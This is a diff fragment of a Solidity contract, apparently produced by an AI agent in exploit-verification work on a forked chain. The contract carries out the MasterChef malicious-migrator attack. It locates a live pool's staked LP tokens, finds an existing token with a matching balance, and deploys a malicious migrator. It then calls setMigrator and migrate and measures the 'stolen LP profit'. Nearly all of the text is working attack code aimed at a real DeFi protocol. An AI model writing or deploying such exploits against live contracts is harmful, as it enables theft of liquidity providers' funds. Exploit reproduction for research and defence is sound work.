+    uint256 public observedPid;
+    address public stagedMaliciousMigrator;
+    string public exploitPathUsed;
+    string public infeasibilityReason;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        _resetState();
+
+        checkedTarget = true;
+        _profitToken = WETH;
+        exploitPathUsed =
+            "Owner sets a malicious migrator with setMigrator() -> anyone calls migrate(pid) -> MasterChef approves the migrator for the pool's full LP balance -> migrator transfers out the genuine LP tokens and returns a fake token with a matching balance -> MasterChef updates pool.lpToken, so future withdrawals return the fake asset instead of the original collateral";
+
+        targetHasCode = TARGET.code.length != 0;
+        if (!targetHasCode) {
+            infeasibilityReason = "target address has no code at the fork";
+            return;
+        }
+
+        observedTargetOwner = _readOwner(TARGET);
+        observedFactory = _readFactory(TARGET);
+
+        observedMasterChef = _readOwner(SUSHI);
+        if (observedMasterChef.code.length == 0) {
+            infeasibilityReason = "could not discover a live MasterChef from SushiToken ownership on this fork";
+            return;
+        }
+
+        (bool hasMigrator, address migrator_) =
+            _tryReadAddress(observedMasterChef, abi.encodeWithSelector(IMasterChefLike.migrator.selector));
+        (bool hasPoolLength, uint256 poolLength_) =
+            _tryReadUint(observedMasterChef, abi.encodeWithSelector(IMasterChefLike.poolLength.selector));
+
+        if (!hasMigrator || !hasPoolLength) {
+            infeasibilityReason = "discovered Sushi owner does not expose the MasterChef migrator flow on this fork";
+            return;
+        }
+
+        targetExposesMigratorFlow = true;
+        migrateCallReachable = true;
+        observedMigrator = migrator_;
+        observedPoolLength = poolLength_;
+        observedOwner = _readOwner(observedMasterChef);
+
+        _snapshotPoolState(observedMasterChef);
+        if (observedPoolLpToken == address(0) || observedTargetLpBalance == 0) {
+            infeasibilityReason = "no live MasterChef pool with staked LP collateral was found in the scan window";
+            return;
+        }
+
+        // The exploit must preserve the original root cause: the pool is swapped onto a non-original token
+        // solely because MasterChef trusts migrate() and only checks balanceOf(this). To avoid cheating by
+        // deploying a fake ERC20, the verifier searches for an already-existing on-chain token that the chef
+        // already holds at the exact same balance, which is still enough to satisfy the vulnerable invariant.
+        observedReplacementToken = _findExistingReplacementToken(observedMasterChef, observedPoolLpBalance());
+        if (observedReplacementToken == address(0)) {
+            infeasibilityReason =
+                "blocked at stage 4: no already-existing on-chain token with a matching MasterChef balance was found";
+            return;
+        }
+
+        ownerStageReachable = observedOwner == address(this);
+        if (!ownerStageReachable) {
+            infeasibilityReason = "blocked at stage 1: setMigrator() remains owner-gated on the live MasterChef";
+            return;
+        }
+
+        stagedMaliciousMigrator = address(new MaliciousMigratorScaffold());
+        MaliciousMigratorScaffold(stagedMaliciousMigrator).configure(address(this), observedReplacementToken);
+
+        IMasterChefLike(observedMasterChef).setMigrator(stagedMaliciousMigrator);
+        approvalStageReachable = true;
+
+        IMasterChefLike(observedMasterChef).migrate(observedPid);
+        fakeReplacementStageReachable = true;
+
+        (address newLpToken,,,) = IMasterChefLike(observedMasterChef).poolInfo(observedPid);
+        poolReplacementStageReachable = newLpToken == observedReplacementToken;
+
+        _profitToken = observedPoolLpToken;
+        _profitAmount = _safeBalanceOf(observedPoolLpToken, address(this));
+        _hypothesisValidated = poolReplacementStageReachable && _profitAmount != 0;
+
+        if (!_hypothesisValidated && infeasibilityReasonBytesEmpty()) {
+            infeasibilityReason =
+                "migration call completed without producing stolen LP profit and durable pool token replacement";
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function hypothesisValidated() external view returns (bool) {
+        return _hypothesisValidated;
+    }
+
+    function target() external pure returns (address) {
+        return TARGET;
+    }
+
+    function observedPoolLpBalance() public view returns (uint256) {
+        return observedTargetLpBalance;
+    }
+
+    function infeasibilityReasonBytesEmpty() public view returns (bool) {
+        return bytes(infeasibilityReason).length == 0;
+    }
+
+    function _snapshotPoolState(address chefAddress) internal {
+        uint256 poolLength = observedPoolLength;
+        if (poolLength == 0) {
+            return;
+        }
+
+        uint256 scanLimit = poolLength > MAX_POOL_SCAN ? MAX_POOL_SCAN : poolLength;
+        for (uint256 pid = 0; pid < scanLimit; ++pid) {
+            try IMasterChefLike(chefAddress).poolInfo(pid) returns (address lpToken, uint256, uint256, uint256) {
+                uint256 lpBalance = _safeBalanceOf(lpToken, chefAddress);
+                if (lpBalance == 0) {
+                    continue;
+                }
+
+                observedPid = pid;
+                observedPoolLpToken = lpToken;
+                observedTargetLpBalance = lpBalance;
+                break;
+            } catch {}
+        }
+    }
+
+    function _findExistingReplacementToken(address chefAddress, uint256 targetBalance) internal view returns (address) {
+        uint256 poolLength = observedPoolLength;
+        if (targetBalance == 0 || poolLength == 0) {
+            return address(0);
+        }
+
+        uint256 scanLimit = poolLength > MAX_POOL_SCAN ? MAX_POOL_SCAN : poolLength;
+        for (uint256 pid = 0; pid < scanLimit; ++pid) {
+            try IMasterChefLike(chefAddress).poolInfo(pid) returns (address lpToken, uint256, uint256, uint256) {
+                if (lpToken == address(0) || lpToken == observedPoolLpToken || lpToken.code.length == 0) {
+                    continue;
+                }
+
+                uint256 replacementBalance = _safeBalanceOf(lpToken, chefAddress);
+                if (replacementBalance == targetBalance) {
+                    return lpToken;
+                }
+            } catch {}
+        }
+
+        if (WETH != observedPoolLpToken && _safeBalanceOf(WETH, chefAddress) == targetBalance) {
+            return WETH;
+        }
+        if (SUSHI != observedPoolLpToken && _safeBalanceOf(SUSHI, chefAddress) == targetBalance) {
+            return SUSHI;
+        }
+
+        return address(0);
+    }
+
+    function _readOwner(address account) internal view returns (address owner_) {
+        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(IOwnableLike.owner.selector));
+        if (success && data.length >= 32) {
+            owner_ = abi.decode(data, (address));
+        }
+    }
+
+    function _readFactory(address account) internal view returns (address factory_) {
+        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(ISushiMakerLike.factory.selector));
+        if (success && data.length >= 32) {
+            factory_ = abi.decode(data, (address));
+        }
+    }
+
+    function _tryReadAddress(address account, bytes memory callData) internal view returns (bool ok, address value) {
+        (bool success, bytes memory data) = account.staticcall(callData);
+        if (!success || data.length < 32) {
+            return (false, address(0));
+        }
+        return (true, abi.decode(data, (address)));
+    }
+
+    function _tryReadUint(address account, bytes memory callData) internal view returns (bool ok, uint256 value) {
+        (bool success, bytes memory data) = account.staticcall(callData);
+        if (!success || data.length < 32) {
+            return (false, 0);
+        }
+        return (true, abi.decode(data, (uint256)));
+    }
+
+    function _resetState() internal {
+        _profitToken = address(0);
+        _profitAmount = 0;
+        _hypothesisValidated = false;
+
+        checkedTarget = false;
+        targetHasCode = false;
+        targetExposesMigratorFlow = false;
+        ownerStageReachable = false;
+        migrateCallReachable = false;
+        approvalStageReachable = false;
+        fakeReplacementStageReachable = false;
+        poolReplacementStageReachable = false;
+
+        observedTargetOwner = address(0);
+        observedFactory = address(0);
+        observedMasterChef = address(0);
+        observedOwner = address(0);
+        observedMigrator = address(0);
+        observedPoolLpToken = address(0);
+        observedReplacementToken = address(0);
+        observedPoolLength = 0;
+        observedTargetLpBalance = 0;
+        observedPid = 0;
+        stagedMaliciousMigrator = address(0);
+        exploitPathUsed = "none";
+        infeasibilityReason = "";
+    }
+
+    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
+        if (token.code.length == 0) {
+            return 0;
+        }
+
+        (bool success, bytes memory data) =
+            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
+        if (!success || data.length < 32) {
+            return 0;
+        }
+
+        balance = abi.decode(data, (uint256));
+    }
+}
+tokens used
+42,262
